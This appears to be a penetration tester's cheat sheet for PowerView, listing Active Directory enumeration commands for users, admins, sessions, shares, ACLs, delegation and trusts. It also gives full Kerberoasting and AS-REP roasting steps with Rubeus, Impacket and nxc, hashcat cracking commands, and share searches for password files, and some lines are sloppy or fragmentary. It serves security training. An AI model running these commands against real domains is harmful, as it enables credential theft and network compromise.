---
title: Powerview.ps1 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active directory
  - ldap
  - windows
  - enumeration
  - reconnaissance
  - tools
---
# Powerview.ps1 

## Setup

Download PowerView from the PowerSploit repository:  
[https://github.com/ZeroDayLab/PowerSploit](https://github.com/ZeroDayLab/PowerSploit)

```powershell
cd c:\
Import-Module .\Powerview.ps1 -Verbose
```

Typical Red Team Enumeration Flow:

1. Domain context
2. Enumerate users
3. Find privileged users
4. Identify Kerberoast targets
5. Enumerate computers
6. Discover local admin rights
7. Find active user sessions
8. Hunt file shares
9. Discover ACL privilege escalation
10. Enumerate domain trusts



---

# Situational Awareness

## Domain Information

```powershell
Get-NetDomain
Get-Domain
Get-DomainID
Get-DomainController
Get-NetDomainController
Get-DomainPolicy

# Current domain SID (for Golden tickets attacks)
Get-DomainSID

# Current domain name
Get-Domain | select name

# Policy


# Current logged user context
Get-DomainUser -Identity $env:USERNAME

# Current machine object
Get-DomainComputer -Identity $env:COMPUTERNAME
```

---

# User Enumeration

```powershell
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon

Get-NetUser
Get-NetUser john.doe

# Returns user who are Service Principal
Get-NetUser -SPN 

Get-DomainUser
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### Privilege Enumeration

```powershell
Find-LocalAdminAccess

Test-AdminAccess

# Enumerate Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"

# Enterprise Admins
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administrators
Get-DomainGroupMember -Identity "Administrators"

# All privileged users. AdminCount = 1 finds protected accounts
Get-DomainUser -AdminCount 1
```

### ACL / Privilege Escalation Discovery 

```
Find-InterestingDomainAcl


# Check ACLs of a specific object
Get-DomainObjectAcl -Identity "Domain Admins"

# Resolve GUIDs in ACL output
Get-DomainObjectAcl -ResolveGUIDs


# Find users who can modify groups
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
```


---

# Group Enumeration

```powershell
Get-NetGroup
Get-NetGroup "Sales Department" | select member

Get-DomainGroup
Get-DomainGroupMember
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

---

# Computer Enumeration

```powershell
Get-NetComputer
Get-NetComputer | select name,operatingsystemversion
Get-NetComputer -OperatingSystem "Linux"

Get-DomainComputer
```

Typical enumeration queries:

```powershell
# Find domain controllers
Get-DomainComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=8192)"

# Find SQL servers
Get-DomainComputer -SPN "MSSQL*"

# Find unconstrained delegation
Get-DomainComputer -Unconstrained

# Find machines with constrained delegation
Get-DomainComputer -TrustedToAuth
```

---

# Lateral movements

```powershell
# 
Find-LocalAdminAccess

# Do I have access to
Test-AdminAccess client74.corp.com
# Returns boolean

# Find where users are logged in
Find-DomainUserLocation

# Find sessions on machines. Use verbose in case of empry result to understand what is really happening under the hood
Get-NetSession -ComputerName files04 -Verbose
# Example: # Example: G



# Find logged in users
Get-NetLoggedon

# Find processes owned by users
Get-NetProcess
```


## Delegation Attacks 

```
# Unconstrained delegation
Get-DomainComputer -Unconstrained

# Constrained delegation
Get-DomainUser -TrustedToAuth

# Resource-based constrained delegation
Get-DomainComputer -TrustedToAuth
```

---

# GPO Enumeration

```powershell
Get-NetGPO
Get-DomainGPO
Get-DomainPolicy
```

---

# Organizational Units

```powershell
Get-DomainOU
```

---

# Trust Enumeration

```powershell
Get-NetDomainTrust

Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping

Get-DomainForeignUser
Get-DomainForeignGroupMember
```

---

# Kerberos / SPN Enumeration

```powershell

#################
# Kerberoasting TGS-rep
################

# 1- Kerberoast targets: List users who are SPNs (Service Principals)
Get-DomainUser -SPN

# 2- Filter by the serviceprincipalname
Get-DomainUser -SPN | select serviceprincipalname
# Example of output: {
# NOW create a domain ticket, kerberoast it!
Get-DomainSPNTicket -SPN HTTP/web04.corp.com

# 3. Instead of requesting one SPN manually (#1 and #2 ), run:
Invoke-Kerberoast -OutputFormat Hashcat

# And to print just the HASH
(Get-DomainSPNTicket -SPN HTTP/web04.corp.com).Hash
(Get-DomainSPNTicket -SPN HTTP/web04.corp.com).Hash | Out-File c:\Users\stephanie\Desktop\hash.txt  -Verbose
(Get-DomainSPNTicket -SPN HTTP/web04.corp.com).Hash > hash.txt
Get-DomainSPNTicket -SPN HTTP/web04.corp.com | Select -ExpandProperty Hash
Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt


# Retrieve the IP of the machine for loggin purposes
nslookup web04.corp.com
```


Crack it offline with hashcat module 13100 (Kerberos 5, etype 23,  TGS-rep):

```
hashcat -m 13100 hash.txt  /usr/share/wordlists/rockyou.txt 
```


```powershell

#################
# AS-REP roasting 
################

# AS-REP roasting targets
Get-DomainUser -PreauthNotRequired

## Option 1, with Powerview
#  Let's say from previous command we obtain user dave, we can now **AS-REP roast the user `dave`**. Typically we would go with:
Get-ASREPHash -UserName dave

# Option 2 But the Powerview version may not have those. We may use instead Rubeus:
.\Rubeus.exe asreproast /user:dave

# Or dump all vulnerable ones
.\Rubeus.exe asreproast /user:dave

# Option 3: with nxd firt enumerate users
nxc ldap 192.168.185.70 -u "users.txt" -p '' -k
# In results it's mention that is vulnerable to asreproast attack, so step 2, attack:
nxc ldap 192.168.185.70 -u dave -p '' --asreproast output.txt


# Option 3: from kali with Impacket
GetNPUsers.py corp.com/dave -dc-ip 192.168.185.70 -no-pass

# Option 4: from kali with Impacket BUT using a file
GetNPUsers -dc-ip 192.168.185.70  corp.com/ -usersfile users.txt -format john -outputfile hashes
```

Crack it offline with hashcat module 18200 (Kerberos 5, etype 23, AS-REP):

```
hashcat -m 18200 h2.txt  /usr/share/wordlists/rockyou.txt 
```


```powershell
# Users with passwords not required
Get-DomainUser -UACFilter PASSWD_NOTREQD

# Users with reversible encryption
Get-DomainUser -UACFilter ENCRYPTED_TEXT_PASSWORD_ALLOWED
```




---

# File Server and DFS Enumeration

```powershell
Get-DomainFileServer
Get-DomainDFSShare
```

---

# Share Enumeration

```powershell
Find-DomainShare -Verbose

# Check accesse to those shares
Find-DomainShare --CheckShareAccess

Find-InterestingDomainShareFile

Get-NetShare

# Find shares across domain
Invoke-ShareFinder

# Find sensitive files
Invoke-FileFinder

# Search for keywords
Invoke-FileFinder -SearchTerms password,creds,secret
```

---

---

# Session Enumeration

```powershell
Get-NetSession
```

---

# Local Group Enumeration

```powershell
Get-NetLocalGroup
Get-NetLocalGroupMember
```

---

# ACL Enumeration

```powershell
Find-InterestingDomainAcl
```

---

# High Value Discovery (Threaded Meta Functions)[[delete2#WKS01]]

```powershell
Find-DomainUserLocation
Find-DomainShare
Find-InterestingDomainShareFile
Find-LocalAdminAccess
```